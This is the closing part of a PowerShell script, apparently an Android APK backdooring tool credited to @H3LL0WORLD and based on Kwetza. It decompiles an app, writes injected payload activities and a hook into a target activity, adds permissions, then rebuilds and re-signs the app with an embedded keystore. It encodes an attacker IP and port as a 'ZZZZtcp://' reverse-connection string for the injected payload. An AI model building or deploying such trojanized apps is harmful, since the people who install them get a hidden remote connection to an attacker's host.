		if ($PSBoundParameters['Force']) {
			$Command += ' -f'
		}
	
		$Result = Invoke-Apktool $Command
		if ($Result -match 'error|Exception') {
			Write-Result '[!] There was an error re-building the Apk' Error
			Write-Result $Result Warning
			return
		}
		
		<# Create your own keystore:
			keytool -genkey -keystore keystore -alias aliasName -keyalg RSA -keysize 1024 -validity 10000 -storepass password -keypass password
			[Convert]::ToBase64String([IO.File]::ReadAllBytes("$PWD\keystore")) | clip
		#>
		$Keystore = [Convert]::FromBase64String('/u3+7QAAAAIAAAABAAAAAQAJYWxpYXNuYW1lAAABXLv78dMAAAK5MIICtTAOBgorBgEEASoCEQEBBQAEggKhveuMhlZJL/9PWsSo4N/I6ZFeKpY3mymrMXOW+YiPsFJqnWCU1pZzeOiIXCo9Ezco7rSpw96LN73IkXwhEEbhj2VhRSALkQzSu8Xuwv+zT9YTUFtC01ETQ2yggv257qrOQl/YODVWiVJlyfN6KeDtOMoOMBb8oBwZOefFsOLCfZ0YxtCSsAVLRUhznDquy5JC9ay/zl8tIlLankEL8bjMFHme8WrCIsrYtk6bw9QoKuc2aUg+qTF7LuSbrt6naie/qj6pcOEQS/2w8vYtGvDLLfVVbrZPeOL5nAghsBRd6b6VVfswWKbZa6B3vxVIIhVT+r2FD7Lx7ZRPqrV4CZqIf9ft8T6fwDIk3K0Z0U7i/n502V2AEyBewFL+iuxbW+M8Hgp+2TWd9MYJgJ+E79RYB4iN1JhRsWmV68Iks+tMnPgGY4eZMDolt40JcsXUhZ0k2ZAEKH1LtTON8HkY/w/vVLz7Qyw5dKn7m6oaytZ9bRX3jAMb3Jk/zGlEzelQaoPXAuGPzKbQIG3ltWJyui5Hq/qLZ0NpbXtieUZ9WxiiMK0g1uoyEEV3/T6J7zSrTq0dwr3z/1REILNc1Cu4XAcnoxl9rpYj6sZKFMjo1mi9eTecxZ0LTXaMWBgEdCGx2uRABi2lNceWLZXKI7UDdts98VPiOtM+kiiwgFJbUtTXZpEtslRYzFFkMa+FzzY+sfUaM1B55GPbwo5mpOFZO0KHDaC9NL+Y6gGRdUAfk88TGVo8U20qxlHPqqLkJ1e8VZHSL/BNE/HQAZ5MgbX+OT2qNd0St+EPOkFV4gqFQsRMte9CTr5SUXiwDMHIRhdjDvnTQ2TP4obLSWYi+e6hHCOUPTOA5htbLJsKjr/ukV+O44ZUc/seP7jz3bf+SH9rtyEHOAAAAAEABVguNTA5AAACdjCCAnIwggHboAMCAQICBFJHaEYwDQYJKoZIhvcNAQELBQAwbDEQMA4GA1UEBhMHVW5rbm93bjEQMA4GA1UECBMHVW5rbm93bjEQMA4GA1UEBxMHVW5rbm93bjEQMA4GA1UEChMHVW5rbm93bjEQMA4GA1UECxMHVW5rbm93bjEQMA4GA1UEAxMHVW5rbm93bjAeFw0xNzA2MTgxNjE0MjlaFw00NDExMDMxNjE0MjlaMGwxEDAOBgNVBAYTB1Vua25vd24xEDAOBgNVBAgTB1Vua25vd24xEDAOBgNVBAcTB1Vua25vd24xEDAOBgNVBAoTB1Vua25vd24xEDAOBgNVBAsTB1Vua25vd24xEDAOBgNVBAMTB1Vua25vd24wgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAJh8ALXEWuxI+xxpIvm0cGlqGaYH/EbXtDK9npXkPi/ooBEHqNVDIqHEjceSbloFc2B/CAxVrBlk+HMhqrBKsqF/wciOXvWEjnYi4QfgligQ9+raBstGkmhUycPpVzaP3qBJMEEq1/eJGAi40Ox633bCv1SsP7AtxtBF3qrUixFnAgMBAAGjITAfMB0GA1UdDgQWBBRSD6cYBsJTLXE8sOi6/Ye2mIt7yTANBgkqhkiG9w0BAQsFAAOBgQCQq0HX7j1NELFj934QcPGWnlDRtPMee7tLBpGQltPpLJ0s9Nzrjlt441j5FszhPIrMIXnxn6twntusCe1N0D4yg1CYfQ3ymtS3aA+J85cPoh30+OlNWaEAA27QtWiT4JdUuSv0OlnGkym4Etu89o6jmw3j55JXXhPs+HqpPtW02JJQPoOpUqF/2FBK2DR+3d/dO6aE')
		$KeystorePath = $env:TMP + '\' + [guid]::NewGuid().Guid
		[IO.File]::WriteAllBytes($KeystorePath, $Keystore)
		
		$JarSignerCommand = 'jarsigner -keystore {0} -storepass {1} {2} {3} -sigalg MD5withRSA -digestalg SHA1' -f $KeystorePath, 'password', $PathToNewApk, 'aliasName'
	}

	PROCESS
	{
#		Write-Host "[*] EXECUTING APKTOOL BUILD COMMAND..."
#		$BuildingResult = IEX $BuildCommand | Out-String
#		Write-Host "[+] BUILD RESULT"
		

		if (-Not (Test-Path $PathToNewApk)) {
			Write-Result '[!] There was an error compiling the Apk' Error
			break
		}
	
		#Write-Host "`n[*] Jarsigning Apk..."
		Write-Command sign
		$JarsignerResult = IEX $JarSignerCommand | Out-String
		[IO.File]::Delete($KeystorePath)
#		Write-Host "[+] JARSIGNER RESULT"
		#Write-Host '+-------------------------------------------------------------------------------+'
		if ($JarsignerResult -match 'jar signed') {
			Write-Result "[!] Signed"
		} else {
			Write-Result "[!] Error signing apk" Error
		}
		#Write-Host "+-------------------------------------------------------------------------------+"
	}

	END
	{
		return $PathToNewApk
	}
}

Function Check-Dependencies {
	Write-Command check_dependencies
	try {
		$JavaVersion = (Get-Command java).Version
		
		if ($JavaVersion -lt ([Version]'7.0')) {
			Write-Result '[!] Please install Java 7+ and make it the default' Warning
			return $false
		}
		
	} catch {
		Write-Result '[!] Java 7+ is required, please install it' Error
		return $false
	}
	
	## Find jarsigner
	$Jarsigner = Resolve-Path (${env:ProgramFiles(x86)} + '\Java\jdk*\bin\jarsigner.exe')
	if (-Not $Jarsigner) {
	
		try {
			$Jarsigner = Resolve-Path ($env:ProgramFiles + '\Java\jdk*\bin\jarsigner.exe')
		} catch {
			Write-Result '[!] Jarsigner is required, please install it' Error
		}
		
	}
	
	Set-Alias 'jarsigner' $Jarsigner.Path -Scope 'Script'
	
	if (-Not (Get-Command Apktool -ErrorAction SilentlyContinue)) {
	
		Write-Result '[!] Apktool 2+ is required, please install it and add it to the PATH environment variable' Warning
		return $false
		
	} elseif ([Version](apktool -version) -lt [Version]'2.0') {
	
		Write-Result '[!] Please install Apktool 2+ and make it the default' Error
		return $false
		
	}
	return $true
}
#endregion


#region Logging functions

Function Write-Banner {
	Write-Host @"

       :::::::::::       :::::::::      :::    :::       :::::::: 
          :+:           :+:    :+:     :+:    :+:      :+:    :+: 
         +:+           +:+    +:+     +:+    +:+      +:+         
        +#+           +#++:++#:      +#+    +:+      +#++:++#++   
       +#+           +#+    +#+     +#+    +#+             +#+    
      #+#           #+#    #+#     #+#    #+#      #+#    #+#     
 ###########       ###    ###      ########        ########       

"@
	Write-Host "              By @H3LL0WORLD, based on Kwetza          `n" -Foreground Gray
	#'\x48\x33\x4c\x4c\x30\x57\x4f\x52\x4c\x44'
}

Function Write-Command {
	Param (
		[Parameter(Mandatory = $True, Position = 0)]
		[String] $Command
	)
	
	Write-Host "irus:~$ " -NoNewline -Foreground Cyan
	Write-Host $Command
}

Function Write-Result {
	Param (
		[Parameter(Mandatory = $True, Position = 0)]
		[String] $Result,
		
		[Parameter(Mandatory = $False, Position = 1)]
		[ValidateSet('Success', 'Error', 'Warning')]
		[String] $Mode = 'Success'
	)
	Switch ($Mode) {
		'Success' {
			$Color = 'Green'
			break
		}
		
		'Error' {
			$Color = 'Red'
			break
		}
		
		'Warning' {
			$Color = 'Yellow'
			break
		}
	}
	
	Write-Host $Result -Foreground $Color
}

#endregion

#region Main function

Write-Banner
if (-Not (Check-Dependencies)) {
	return
}

if ($PSBoundParameters['Apk']) {
	$ApkPath = [IO.FileInfo](Resolve-Path $Apk).Path
	$DecompiledApk = Decompile-Apk $ApkPath $Force
	$ApkName = $ApkPath.Name
} else {
	$DecompiledApk = (Resolve-Path $DecompiledApk).Path
	$ApkName = ([IO.DirectoryInfo]$DecompiledApk).Name
}

$SRVHOST = 'ZZZZtcp://{0}:{1}' -f $IP, $Port
$0xHost = [Char[]]$SRVHOST | % {"`t`t0x{0:x2}" -f [UInt32]$_} | Out-String
$0xHostLength = '0x{0:x2}' -f $SRVHOST.Length

$TargetActivity = Get-TargetActivity -DecompiledApk $DecompiledApk
$ActivityInfo = Write-Payloads $DecompiledApk $TargetActivity $0xHost $0xHostLength

Write-ApkHook $ActivityInfo $DecompiledApk

if ($PSBoundParameters['Permissions'] -ne 'Default') {
	Write-Permissions $DecompiledApk $Permissions
}

$NewApk = Build-Apk $DecompiledApk $ApkName $Force

if ($PSBoundParameters['DecompiledApk']) {
	
	#Write-Host '[*] Restoring target activity'
	Write-Command restore target_activity
	[IO.File]::WriteAllLines($ActivityInfo.File.FullName, $BackupActivityContent)	
	
	if ($BackupManifest) {
		#Write-Host '[*] Restoring manifest'
		Write-Command restore manifest
		[IO.File]::WriteAllText("$DecompiledApk\AndroidManifest.xml", $BackupManifest)
	}
	
	#Write-Host '[*] Removing helper activities'
	Write-Command remove helper_activities
	Remove-Item -Path $PathPayload1 -Force
	Remove-Item -Path $PathPayload2 -Force
}

Write-Command show
# Too lazy to declare another function, lol
{
	Param (
		$Path = ""
	)
	
	$0 = '  '+       $Path       +'  '
	$1 = '+' + ('-' * $0.Length) + '+'
	$2 = '|' + (" " * $0.Length) + '|'
	$3 = '=' +        $0         + '='

	$1, $2, $3, $2, $1 | % {Write-Host $_ -Fore 'Green'}

}.Invoke($NewApk)

Write-Command exit`n

#endregion